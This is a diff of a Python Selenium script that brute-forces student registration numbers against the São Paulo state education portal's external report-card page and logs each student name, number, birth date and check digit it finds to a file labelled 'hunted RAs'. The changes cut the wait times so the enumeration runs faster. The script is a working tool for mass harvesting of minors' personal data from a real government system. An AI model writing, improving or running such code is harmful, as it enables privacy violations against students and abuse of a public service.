@@ -5,11 +5,11 @@ from selenium.webdriver.support import expected_conditions as EC
 from time import sleep
 import datetime
 
-texto = open("R.AsCaçados.txt", "a")
-log = open("log.txt", "a")
-for raNum in range(106190252, 107409999):
+texto = open("PYTHON\R.AsCaçados2.txt", "a")
+log = open("PYTHON\log2.txt", "a")
+for raNum in range(107030265, 107409999):
 #for raNum in range(107058872, 107058877):
-    try:
+    try: 
         agora = datetime.datetime.now()
         agora_formatado = agora.strftime("%Y-%m-%d %H:%M:%S")
         ano = "2019"
@@ -19,13 +19,12 @@ for raNum in range(106190252, 107409999):
         driver = webdriver.Chrome()
         driver.get(
             f"https://sed.educacao.sp.gov.br/Boletim/GerarBoletimUnificadoExterno?nrRa=000{+raNum}&nrDigRa={digito}&dsUfRa=SP&dtNascimento={data}&nrAnoLetivo={ano}")
-        wait = WebDriverWait(driver, 15)
+        wait = WebDriverWait(driver, 2)
         nome = wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div/div/div[2]/div/div/div[2]")))
         #print(f"\033[32m{nome.text}\033[m")
         #print(f"\033[32m{raNum}\033[m")
         texto.writelines(f"Nome: {nome.text}, RA: {raNum},Data: {data}, Digito: {digito}\n")
         texto.flush()
-        sleep(1)
 
     except:
         #print(f"\033[31mRA de 000{raNum} Não deu certo\033[m")
